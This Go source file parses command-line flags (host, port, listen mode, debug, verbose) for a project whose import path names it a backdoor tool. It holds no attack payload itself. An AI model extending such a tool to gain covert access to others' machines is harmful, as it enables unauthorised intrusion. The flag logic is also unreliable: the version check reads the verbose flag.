package cli

import (
	"fmt"
	"os"
	"net"
	"github.com/spf13/pflag"
	"github.com/pilebones/backdoorGolang/core/common"
)

var (
	host    	= pflag.StringP("host", "h", "localhost", "Set hostname to use")
	port    	= pflag.IntP("port", "p", 9876, "Set port number to use")
	isListenMode 	= pflag.BoolP("listen", "l", false, "Enable listen mode (server socket mode)")
	isVerboseMode 	= pflag.BoolP("verbose", "v", false, "Enable mode verbose")
	isDebugMode 	= pflag.BoolP("debug", "d", false, "Enable mode debug")
	isVersionMode 	= pflag.BoolP("version", "V", false, "Display version number")
)

/** Print data when debug mode is enabled */
func DisplayAsDebug(message string) {
	if UseDebugMode() {
		fmt.Println(message)
	}
}

/** Return true if mode use from parameter */
func UseMode(mode *bool) bool {
	var useMode bool = false
	if *mode {
		useMode = true
	}
	return useMode
}

/** Return true if debug mode is enabled */
func UseDebugMode() bool {
	return UseMode(isDebugMode)
}

/** Return true if listen mode is enabled */
func UseListenMode() bool {
	return UseMode(isListenMode)
}

/** Return true if the user want to see the program version */
func UseVersionMode() bool {
	return UseMode(isVerboseMode)
}

/** Parse arguments and check value is allowed */
func InitFlags() Context {

	// Handle errors in defer func with recover.
	defer func() {
		if err := recover(); err != nil {
			// Handle our error.
			fmt.Println("Error : ", err)
			os.Exit(1)
		}
	}()

	pflag.Parse()

	if UseVersionMode() {
		fmt.Printf("%s : Build %s Version %s\nAuthor : %s (see: %s)", common.PRODUCT_NAME, common.BUILD, common.VERSION, common.AUTHOR, common.CONTACT)
		os.Exit(0)
	}

	return generateContextFromFlags()
}

/** Parse, Validate flags and generate CLI context Object from CLI Arguments */
func generateContextFromFlags() Context {
	context := new(Context)
	context.Host = *host
	context.Port = *port
	context.IsHostIsResolved = false
	context.UseDebugMode = UseDebugMode()
	context.UseListenMode = UseListenMode()
	context.UseVerboseMode = UseVersionMode()

	DisplayAsDebug("Debug mode enabled")

	// Resolv hostname as net.IP
	var ip net.IP = net.ParseIP(*host)
	if ip == nil { // if argument isn't IP => check if the hostname can be resolved
		ips, err := net.LookupIP(*host)
		if err != nil {
			panic(fmt.Sprintf("Couln't resolv hostname \"%s\"", *host))
		} else {
			context.Host = *host
			if 1 < len(ips) {
				context.IsHostIsResolved = true
				context.Ipv4 = ips[1]
				context.Ipv6 = ips[0]
			} else {
				panic(fmt.Sprintf("Couln't resolv from hostname IPv4  \"%s\"", *host))
			}
		}
	} else {
		context.Ipv4 = ip.To4()
		context.Ipv6 = ip.To16()
	}

	DisplayAsDebug(context.ToString())

	return *context
}